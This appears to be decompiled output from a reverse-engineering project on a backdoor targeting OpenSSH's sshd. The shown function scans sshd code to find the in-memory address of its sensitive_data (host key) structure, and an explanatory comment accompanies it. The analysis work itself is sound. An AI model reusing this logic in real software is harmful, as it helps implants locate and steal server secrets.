// /home/kali/xzre-ghidra/xzregh/103680_sshd_get_sensitive_data_address_via_xcalloc.c
// Function: sshd_get_sensitive_data_address_via_xcalloc @ 0x103680
// Calling convention: unknown
// Prototype: undefined sshd_get_sensitive_data_address_via_xcalloc(void)


/*
 * AutoDoc: Locates the call site that matches the cached xcalloc reference, walks the following basic
 * block looking for the MOV/LEA that parks the return value in .bss, and collects up to sixteen
 * such stores. Whenever it sees three consecutive slots separated by 8 bytes (pointer,
 * pointer+8, pointer+0x10) it treats the lowest address as the sensitive_data candidate
 * generated during sshd's early zero-initialisation.
 */
#include "xzre_types.h"


undefined8
sshd_get_sensitive_data_address_via_xcalloc
          (ulong param_1,ulong param_2,ulong param_3,ulong param_4,long param_5,ulong *param_6)

{
  byte bVar1;
  int iVar2;
  long lVar3;
  long lVar4;
  long lVar5;
  ulong *puVar6;
  long *plVar7;
  ulong uVar8;
  ulong uVar9;
  byte bVar10;
  byte bVar11;
  long store_hits [16];
  long local_100;
  long local_f8;
  ushort local_f0;
  char local_e5;
  undefined4 local_e4;
  byte local_e0;
  ulong local_d0;
  ulong local_a8 [16];
  
  *param_6 = 0;
  lVar4 = *(long *)(param_5 + 8);
  if (lVar4 == 0) {
    return 0;
  }
  bVar11 = 0xff;
  uVar8 = 0;
  bVar10 = 0;
  puVar6 = local_a8;
  for (lVar3 = 0x20; lVar3 != 0; lVar3 = lVar3 + -1) {
    *(undefined4 *)puVar6 = 0;
    puVar6 = (ulong *)((long)puVar6 + 4);
  }
  plVar7 = &local_100;
  for (lVar3 = 0x16; lVar3 != 0; lVar3 = lVar3 + -1) {
    *(undefined4 *)plVar7 = 0;
    plVar7 = (long *)((long)plVar7 + 4);
  }
LAB_001036eb:
  do {
    if ((param_4 <= param_3) || (iVar2 = find_call_instruction(param_3,param_4,lVar4), iVar2 == 0))
    goto LAB_00103802;
    param_3 = local_f8 + local_100;
    iVar2 = find_instruction_with_mem_operand_ex(param_3,param_3 + 0x20,&local_100,0x109,0);
  } while (iVar2 == 0);
  if ((local_f0 & 0x1040) == 0) {
LAB_00103788:
    if (bVar11 != 0) {
      param_3 = local_f8 + local_100;
      goto LAB_001036eb;
    }
  }
  else {
    if ((local_f0 & 0x40) != 0) {
      bVar11 = local_e4._2_1_;
      if ((local_f0 & 0x20) != 0) {
        bVar1 = local_e5 * '\x02';
LAB_00103782:
        bVar11 = bVar11 | bVar1 & 8;
      }
      goto LAB_00103788;
    }
    if ((local_f0 & 0x1000) != 0) {
      bVar11 = local_e0;
      if ((local_f0 & 0x20) != 0) {
        bVar1 = local_e5 << 3;
        goto LAB_00103782;
      }
      goto LAB_00103788;
    }
  }
  if (((local_f0 & 0x100) != 0) && (uVar8 = local_d0, (local_e4 & 0xff00ff00) == 0x5000000)) {
    uVar8 = local_d0 + local_100 + local_f8;
  }
  if ((param_1 <= uVar8) && (uVar8 < param_2)) {
    uVar9 = (ulong)bVar10;
    bVar10 = bVar10 + 1;
    local_a8[uVar9] = uVar8;
    if (0xf < bVar10) {
LAB_00103802:
      lVar4 = 0;
      do {
        if ((uint)bVar10 <= (uint)lVar4) {
          return 0;
        }
        lVar3 = 0;
        do {
          lVar5 = 0;
          do {
            if ((local_a8[lVar4] == local_a8[lVar3] - 8) && (local_a8[lVar3] == local_a8[lVar5] - 8)
               ) {
              *param_6 = local_a8[lVar4];
              return 1;
            }
            lVar5 = lVar5 + 1;
          } while ((uint)lVar5 < (uint)bVar10);
          lVar3 = lVar3 + 1;
        } while ((uint)lVar3 < (uint)bVar10);
        lVar4 = lVar4 + 1;
      } while( TRUE );
    }
  }
  bVar11 = 0;
  param_3 = local_f8 + local_100;
  goto LAB_001036eb;
}

